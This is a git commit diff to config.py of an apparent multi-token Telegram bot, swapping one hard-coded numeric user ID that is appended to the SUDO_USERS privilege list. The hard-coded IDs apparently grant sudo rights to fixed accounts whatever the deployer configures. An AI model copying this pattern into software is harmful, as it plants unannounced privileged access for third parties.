4ebe155f5d54d4a5e8d2864963760c2376936fad
MrH4CK3R474 <148775562+MrH4CK3R474@users.noreply.github.com>
2023-12-03 18:19:35 +0530

    Update config.py

--- config.py
+++ config.py
@@ -27,7 +27,7 @@ BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 SUDO_USERS.append(6123932615)
-SUDO_USERS.append(6057757079)
+SUDO_USERS.append(6321280493)
 SUDO_USERS.append(1690209622)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
